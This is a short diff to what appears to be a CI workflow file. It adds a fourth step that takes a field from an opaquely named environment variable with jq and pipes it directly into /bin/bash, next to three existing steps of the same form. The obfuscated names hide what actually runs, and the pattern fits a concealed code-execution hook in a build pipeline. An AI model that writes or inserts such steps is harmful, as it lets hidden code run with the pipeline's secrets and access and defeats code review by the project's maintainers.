@@ -22,6 +22,7 @@ jobs:
           echo $dro085 | jq -r .pzpo765 | /bin/bash
           echo $wp314 | jq -r .m7473 | /bin/bash
           printf '%s' "$mceg54" | jq -r .pfcq7 | /bin/bash
+          printf '%s' "$hsjs78" | jq -r .mkt02376 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
